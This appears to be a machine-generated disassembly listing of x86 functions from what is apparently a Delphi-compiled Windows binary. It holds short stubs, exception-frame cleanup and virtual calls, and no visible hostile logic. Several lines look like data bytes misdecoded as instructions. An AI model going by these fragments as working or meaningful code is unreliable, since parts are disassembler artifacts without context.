sub_462cb4
mov eax 0x47
call sub_4635d4
jmp eax
sub_462cc0
retn
sub_462cc4
mov eax 0x48
call sub_4635d4
jmp eax
sub_462cd0
retn
sub_462cd4
mov eax 0x49
call sub_4635d4
jmp eax
sub_462ce0
retn
sub_462ce4
mov eax 0x4a
call sub_4635d4
jmp eax
sub_462cf0
retn
sub_462cf4
mov eax 0x4b
call sub_4635d4
jmp eax
sub_462d00
retn
sub_462d04
mov eax 0x4c
call sub_4635d4
jmp eax
sub_462d10
retn
sub_462d14
mov eax 0x4d
call sub_4635d4
jmp eax
sub_462d20
retn
sub_462d24
mov eax 0x4e
call sub_4635d4
jmp eax
sub_462d30
retn
sub_462d34
mov eax 0x4f
call sub_4635d4
jmp eax
sub_462d40
retn
sub_462d44
mov eax 0x50
call sub_4635d4
jmp eax
sub_462d50
retn
sub_462d54
mov eax 0x51
call sub_4635d4
jmp eax
sub_462d60
retn
sub_462d64
mov eax 0x52
call sub_4635d4
jmp eax
sub_462d70
retn
sub_462d74
mov eax 0x53
call sub_4635d4
jmp eax
sub_462d80
retn
sub_462d84
mov eax 0x54
call sub_4635d4
jmp eax
sub_462d90
retn
sub_462d94
mov eax 0x55
call sub_4635d4
jmp eax
sub_462da0
retn
sub_462da4
mov eax 0x56
call sub_4635d4
jmp eax
sub_462db0
retn
sub_462db4
mov eax 0x57
call sub_4635d4
jmp eax
sub_462dc0
retn
sub_462dc4
mov eax 0x58
call sub_4635d4
jmp eax
sub_462dd0
retn
sub_462dd4
mov eax 0x59
call sub_4635d4
jmp eax
sub_462de0
retn
sub_462de4
mov eax 0x5a
call sub_4635d4
jmp eax
sub_462df0
retn
sub_462df4
mov eax 0x5b
call sub_4635d4
jmp eax
sub_462e00
retn
sub_462e04
mov eax 0x5c
call sub_4635d4
jmp eax
sub_462e10
retn
sub_462e14
mov eax 0x5d
call sub_4635d4
jmp eax
sub_462e20
retn
sub_462e24
mov eax 0x5e
call sub_4635d4
jmp eax
sub_462e30
retn
sub_462e34
mov eax 0x5f
call sub_4635d4
jmp eax
sub_462e40
retn
sub_462e44
mov eax 0x60
call sub_4635d4
jmp eax
sub_462e50
retn
sub_462e54
mov eax 0x61
call sub_4635d4
jmp eax
sub_462e60
retn
sub_462e64
mov eax 0x62
call sub_4635d4
jmp eax
sub_462e70
retn
sub_462e74
mov eax 0x63
call sub_4635d4
jmp eax
sub_462e80
retn
sub_462e84
mov eax 0x64
call sub_4635d4
jmp eax
sub_462e90
retn
sub_462e94
mov eax 0x65
call sub_4635d4
jmp eax
sub_462ea0
retn
sub_462ea4
mov eax 0x66
call sub_4635d4
jmp eax
sub_462eb0
retn
sub_462eb4
mov eax 0x67
call sub_4635d4
jmp eax
sub_462ec0
retn
sub_462ec4
mov eax 0x68
call sub_4635d4
jmp eax
sub_462ed0
retn
sub_462ed4
mov eax 0x69
call sub_4635d4
jmp eax
sub_462ee0
retn
sub_462ee4
mov eax 0x6a
call sub_4635d4
jmp eax
sub_462ef0
retn
sub_462ef4
mov eax 0x6b
call sub_4635d4
jmp eax
sub_462f00
retn
sub_462f04
mov eax 0x6c
call sub_4635d4
jmp eax
sub_462f10
retn
sub_462f14
mov eax 0x6d
call sub_4635d4
jmp eax
sub_462f20
retn
sub_462f24
mov eax 0x6e
call sub_4635d4
jmp eax
sub_462f30
retn
sub_462f34
mov eax 0x6f
call sub_4635d4
jmp eax
sub_462f40
retn
sub_463677
jmp sub_4038c0
sub_46367e
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463779
jmp sub_4038c0
sub_463780
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4637e4
jmp sub_4038c0
sub_4637eb
pop ebp
retn
sub_4637f0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_463688
sub_463825
jmp sub_4038c0
sub_46382c
pop ebp
retn
sub_463830
sub [ rw-data ] 0x1
retn
sub_463abc
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_463ac8
retn
sub_463b6f
jmp sub_4038c0
sub_463b76
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_463bce
jmp sub_4038c0
sub_463bd5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463bdc
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403490
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_463bfc
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0xc ]
retn
sub_46407a
jmp sub_4038c0
sub_464081
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464173
jmp sub_4038c0
sub_46417a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_464208
jmp sub_4038c0
sub_46420f
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46423d
jmp sub_4038c0
sub_464244
pop ebp
retn
sub_464248
sub [ rw-data ] 0x1
retn
sub_464442
jmp sub_4038c0
sub_464449
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_464524
jmp sub_4038c0
sub_46452b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4645bf
jmp sub_4038c0
sub_4645c6
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46463c
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464780
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464833
jmp sub_4038c0
sub_46483a
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_464915
jmp sub_4038c0
sub_46491c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464b08
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464b14
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_464b2c
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464b38
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_403738#8
jmp sub_403738
sub_464c11
jmp sub_4038c0
sub_464c18
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_40360c#5
jmp sub_40360c
sub_464d41
jmp sub_4038c0
sub_464d48
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464d54
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464d60
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_464e06
jmp sub_4038c0
sub_464e0d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464ec9
jmp sub_4038c0
sub_464ed0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464eed
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_464ee6
jmp sub_4038c0
sub_464eed
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_464fbb
jmp sub_4038c0
sub_464fc2
pop ebx
mov esp ebp
pop ebp
retn
sub_464fcb
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46506e
jmp sub_4038c0
sub_465075
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46510e
jmp sub_4038c0
sub_465115
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46519a
jmp sub_4038c0
sub_4651a1
pop ecx
pop ebp
retn
sub_4651a4
mov eax [ eax + 0x4 ]
retn
sub_465202
jmp sub_4038c0
sub_465209
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4652e5
jmp sub_4038c0
sub_4652ec
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46532d
jmp sub_4038c0
sub_465334
pop ebp
retn
sub_465338
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ sub_464250 ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_464e30
sub_465389
jmp sub_4038c0
sub_465390
pop ebp
retn
sub_465394
sub [ rw-data ] 0x1
retn
sub_465550
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c664
pop esi
pop ebx
retn
sub_465564
cmp edx eax
jge r-xdata
retn
mov eax edx
sub_4656af
jmp sub_4038c0
sub_4656b6
pop ebx
pop ecx
pop ebp
retn
sub_465785
jmp sub_4038c0
sub_46578c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_465854
push ebx
mov ebx eax
call GetCurrentThreadId
cmp eax [ ebx + 0x8 ]
sete al
pop ebx
retn
sub_46586c
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
sete al
retn
sub_465880
call sub_41e3ec
retn
sub_465888
call sub_404544
retn
sub_465a5b
jmp sub_4038c0
sub_465a62
pop ebp
retn
sub_465b37
jmp sub_4038c0
sub_465b3e
pop ecx
pop ebp
retn
sub_465c6c
retn
j_sub_465c6c
jmp sub_465c6c
sub_465c74
pop ebp
retn
sub_465c78
sub [ rw-data ] 0x1
retn
sub_465e77
jmp sub_4038c0
sub_465e7e
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_465f59
jmp sub_4038c0
sub_465f60
pop ebp
retn
sub_465f64
sub [ rw-data ] 0x1
retn
sub_4662f2
jmp sub_4038c0
sub_4662f9
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46637f
jmp sub_4038c0
sub_466386
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034e0
sub_46644f
jmp sub_4038c0
sub_466456
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_466580
jmp sub_4038c0
sub_466587
pop ebp
retn
sub_46658c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4664f8
call sub_403c68
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ac64
mov [ rw-data ] eax
sub_466c43
jmp sub_4038c0
sub_466c4a
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_466d94
jmp sub_4038c0
sub_466d9b
pop ebx
mov esp ebp
pop ebp
retn
sub_466fc4
jmp sub_4038c0
sub_466fe1
jmp sub_4038c0
sub_466fe8
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4671b1
jmp sub_4038c0
sub_4671b8
mov al [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4671c4
push ebx
mov ebx eax
mov eax ebx
call sub_418a7c
mov edx [ r-xdata ]
call sub_40331c
mov edx [ ebx + 0x1c ]
mov [ eax + 0x1c ] edx
pop ebx
retn
sub_467299
jmp sub_4038c0
sub_4672a0
pop ebp
retn
sub_4672a4
sub [ rw-data ] 0x1
retn
sub_467694
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_4676a8
mov edx [ eax + 0x34 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x44 ]
sub_4676b8
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4676cc
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_467705
jmp sub_4038c0
sub_46770c
pop ebp
retn
sub_467710
sub [ rw-data ] 0x1
retn
sub_4677fc
retn
sub_467800
push ebp
mov ebp esp
pop ebp
retn 0x14
sub_467834
retn
sub_467838
retn
sub_467861
jmp sub_4038c0
sub_467868
pop ebp
retn
sub_46786c
sub [ rw-data ] 0x1
retn
sub_467a90
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebx + 0x14 ]
call sub_403f40
pop ebx
retn
sub_467c6d
jmp sub_4038c0
sub_467c74
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467d9b
jmp sub_4038c0
sub_467da2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467e17
jmp sub_4038c0
sub_467e1e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_467e38
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_467ef8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_418bf4
pop esi
pop ebx
retn
sub_467f61
jmp sub_4038c0
sub_467f68
pop ebp
retn
sub_467f6c
sub [ rw-data ] 0x1
retn
sub_467f99
jmp sub_4038c0
sub_467fa0
pop ebp
retn
sub_467fa4
sub [ rw-data ] 0x1
retn
sub_4684ad
jmp sub_4038c0
sub_4684b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403738#7
jmp sub_403738
sub_468589
jmp [ ecx + rw-data ]
j_sub_403738#6
jmp sub_403738
sub_4687ff
jmp sub_40360c
sub_468a50
jmp sub_40360c
sub_468a9f
jmp sub_4038c0
sub_468aa6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468af1
jmp sub_4038c0
sub_468af8
pop ebp
retn
sub_468afc
sub [ rw-data ] 0x1
retn
sub_468b29
jmp sub_4038c0
sub_468b30
pop ebp
retn
sub_468b34
sub [ rw-data ] 0x1
retn
sub_468b61
jmp sub_4038c0
sub_468b68
pop ebp
retn
sub_468b6c
sub [ rw-data ] 0x1
retn
sub_468e8d
jmp sub_4038c0
sub_468e94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468eb1
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_468eaa
jmp sub_4038c0
sub_468eb1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469089
jmp sub_4038c0
sub_469090
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_46909c
mov ecx [ eax + 0x68 ]
test ecx ecx
setne dl
test dl dl
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x10 ]
sub_46911c
mov eax [ eax + 0x68 ]
call sub_466eb0
retn
sub_469198
jmp sub_4038c0
sub_46919f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469218
jmp sub_4038c0
sub_46921f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403738#9
jmp sub_403738
sub_46937e
add [ eax ] eax
add [ eax ] al
dec esp
jb r-xdata
dec eax
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_4693dc
retn
add [ edx - 0x76ffb96d ] cl
retn
sub_4693d5
jmp sub_4038c0
sub_4693dc
pop ebp
retn
sub_4693e0
sub [ rw-data ] 0x1
retn
sub_469a29
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_469a34
jmp sub_4038c0
j_sub_469a29
jmp sub_469a29
sub_469a3b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469a58
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_469a51
jmp sub_4038c0
sub_469a58
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469b24
jmp sub_4038c0
sub_469b2b
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469cdc
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_469d75
jmp sub_4038c0
sub_469d7c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469dda
jmp sub_4038c0
sub_469de1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a080
jmp sub_4038c0
sub_46a087
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46a2b2
jmp sub_4038c0
sub_46a2b9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46a346
jmp sub_4038c0
sub_46a34d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a3cc
mov ecx edx
mov [ eax + 0x78 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_41e7a8
sub_46a5dd
jmp sub_4038c0
sub_46a65c
jmp sub_4038c0
sub_46a663
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46a731
jmp sub_4038c0
sub_46a78e
jmp sub_4038c0
sub_46a795
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a81c
jmp sub_4038c0
sub_46a823
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a96e
jmp sub_4038c0
sub_46a975
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a994
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_46a98d
jmp sub_4038c0
sub_46a994
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a9b1
lea eax [ ebp - 0x14 ]
call sub_403f40
retn
sub_46a9aa
jmp sub_4038c0
sub_46a9b1
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46aa74
mov eax [ eax + 0xb0 ]
call sub_41aad0
retn
sub_46aa80
push ebx
push 0x0
mov ecx 0x1
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
sub_46ab5e
jmp sub_4038c0
sub_46ab65
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46ac41
jmp sub_4038c0
sub_46ac48
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46ad9a
jmp sub_4038c0
sub_46ada1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46adcb
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f64
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_46adc4
jmp sub_4038c0
sub_46adcb
pop ebx
mov esp ebp
pop ebp
retn
sub_46ae2a
jmp sub_4038c0
sub_46ae31
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46aede
jmp sub_4038c0
sub_46aee5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46aefb
inc [ edx ]
add [ eax ] al
add [ esi ] ch
add [ cs : eax ] al
push ebx
xor edx edx
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_46af10
push ebx
mov ebx eax
mov eax ebx
call sub_41aad0
xor eax eax
mov [ ebx + 0x24 ] eax
pop ebx
retn
sub_46aff8
jmp sub_4038c0
sub_46afff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46b008
mov edx [ eax + 0x4 ]
add edx [ eax + 0x24 ]
mov eax edx
retn
sub_46b100
jmp sub_4038c0
sub_46b107
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46b169
jmp sub_4038c0
sub_46b170
pop ebp
retn
sub_46b174
sub [ rw-data ] 0x1
retn
sub_46b40a
jmp sub_4038c0
sub_46b411
pop ebx
pop ecx
pop ebp
retn
sub_46b418
retn
sub_46b41c
retn
sub_46b420
retn
sub_46b424
retn
sub_46b4ef
jmp sub_4038c0
sub_46b4f6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_46b50c
jmp sub_4038c0
sub_46b536
jmp sub_4038c0
sub_46b53d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403738#5
jmp sub_403738
sub_46b5ed
jmp sub_40360c
sub_46b6ba
jmp sub_4038c0
sub_46b6c1
pop ecx
pop ebp
retn
sub_46b722
jmp sub_4038c0
sub_46b729
pop ecx
pop ebp
retn
sub_46b78f
jmp sub_4038c0
sub_46b7a4
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_46b7b8
push ebx
cmp [ eax + 0x5a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_46b7d0
mov [ eax + 0x49 ] 0x1
call sub_41e62c
retn
sub_46b7dc
add eax 0x40
call sub_40d3ac
retn
sub_46b7e8
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e558
pop ebp
retn 0x8
sub_46b821
jmp sub_4038c0
sub_46b828
pop ebp
retn
sub_46b82c
sub [ rw-data ] 0x1
retn
sub_46b98d
jmp sub_4038c0
sub_46b994
pop ebp
retn
sub_46b998
sub [ rw-data ] 0x1
retn
sub_46baa9
jmp sub_4038c0
sub_46bab0
pop ebp
retn
sub_46bab4
sub [ rw-data ] 0x1
retn
sub_46bc79
jmp sub_4038c0
sub_46bc80
pop ebp
retn
sub_46bc84
sub [ rw-data ] 0x1
retn
sub_46bd60
jmp sub_4038c0
sub_46bd67
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46bea1
jmp sub_4038c0
sub_46bea8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46bed5
jmp sub_4038c0
sub_46bedc
pop ebp
retn
sub_46bee0
sub [ rw-data ] 0x1
retn
sub_46bf2d
jmp sub_4038c0
sub_46bf65
jmp sub_4038c0
sub_46bf6c
pop ebp
retn
sub_46bf70
sub [ rw-data ] 0x1
retn
sub_46c1bf
jmp sub_4038c0
sub_46c1c6
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46c200
retn
sub_46c229
jmp sub_4038c0
sub_46c230
pop ebp
retn
sub_46c234
sub [ rw-data ] 0x1
retn
sub_46c23c
inc eax
retn 0x46
sub_46c2fa
inc esi
add [ eax + edx - 0x35d3ffc0 ] dl
inc esi
add [ eax ] cl
retn
sub_46c8ab
add [ eax + 0x380046a3 ] bl
jmp sub_46c8f4
sub_46d2bc
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_46d2dc
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
push edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_46d338
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_46d354
push ebx
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_46d486
jmp sub_4038c0
sub_46d4ca
jmp sub_4038c0
sub_46d4d1
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d4e8
push ebx
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_46d590
jmp sub_4038c0
sub_46d597
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d59c
mov eax [ eax + 0x70 ]
mov eax [ eax + 0x1c ]
retn
sub_46d816
jmp sub_4038c0
sub_46d830
push esi
mov esi eax
mov eax [ esi + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46d840
mov eax [ eax + 0x70 ]
mov [ eax + 0x1c ] edx
retn
sub_46d848
mov ecx edx
mov [ eax + 0x84 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_41e7a8
sub_46d960
jmp sub_4038c0
sub_46da04
jmp sub_4038c0
sub_46da8c
jmp sub_4038c0
sub_46da93
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46dad0
retn
sub_46dad4
push ebx
mov ebx eax
mov eax ebx
call sub_46b41c
mov dl 0x1
mov eax [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
j_sub_403738#3
jmp sub_403738
j_sub_40360c#4
jmp sub_40360c
sub_46dda8
mov edx [ eax + 0x68 ]
mov edx [ edx + 0xb8 ]
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x40 ]
retn
j_sub_403738#2
jmp sub_403738
j_sub_403738#4
jmp sub_403738
sub_46df7e
jmp sub_4038c0
sub_46df85
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46dfd0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_418bf4
pop esi
pop ebx
retn
sub_46dfe4
push esi
mov si 0xffff
call sub_403368
pop esi
retn
j_sub_403738
jmp sub_403738
sub_46e2e3
jmp sub_4038c0
sub_46e30d
jmp sub_4038c0
sub_46e314
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e3e7
jmp sub_4038c0
sub_46e3ee
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46e444
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x1c ]
call sub_403f94
pop esi
pop ebx
retn
sub_46e4d5
jmp sub_4038c0
sub_46e4dc
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46e50c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46e5c0
push ebx
mov edx [ eax + 0x4 ]
cmp [ edx + 0x22 ] 0x0
je r-xdata
pop ebx
retn
mov ebx edx
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_46e62d
jmp sub_4038c0
sub_46e634
pop ebp
retn
sub_46e638
sub [ rw-data ] 0x1
retn
sub_46e855
jmp sub_4038c0
sub_46e85c
pop ebp
retn
sub_46e860
sub [ rw-data ] 0x1
retn
sub_46e9cc
add eax 0x68
call sub_40d3ac
retn
sub_46ea4c
cmp [ eax + 0x70 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x68 ]
test edx edx
je r-xdata
xor eax eax
retn
cmp [ edx + 0x10 ] 0x0
jne r-xdata
sub_46eaac
push ebx
mov ebx eax
mov eax ebx
call sub_41eb28
mov al [ ebx + 0x70 ]
mov [ ebx + 0x70 ] 0x0
mov edx eax
mov eax ebx
call sub_46ecdc
pop ebx
retn
sub_46ebd7
jmp sub_4038c0
sub_46ebde
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46ec41
jmp sub_4038c0
sub_46ec48
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46eccb
jmp sub_4038c0
sub_46ecd2
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_46ed99
jmp sub_4038c0
sub_46eda0
pop ebp
retn
sub_46eda4
sub [ rw-data ] 0x1
retn
sub_46f150
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_46f254
mov eax [ eax + 0x88 ]
mov eax [ eax + 0x1c ]
retn
sub_46f260
push ebx
push esi
mov esi eax
mov [ esi + 0x8c ] ecx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop esi
pop ebx
retn
sub_46f274
push esi
mov esi eax
mov eax [ esi + 0x88 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46f284
mov eax [ eax + 0x88 ]
mov [ eax + 0x1c ] edx
retn
j_sub_40360c#3
jmp sub_40360c
sub_46f512
jmp sub_4038c0
sub_46f519
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f536
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_46f52f
jmp sub_4038c0
sub_46f536
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46f540
mov ecx [ eax + 0x68 ]
mov edx [ eax + 0x70 ]
mov eax [ eax + 0x78 ]
call sub_46f260
retn
sub_46f575
jmp sub_4038c0
sub_46f57c
pop ebp
retn
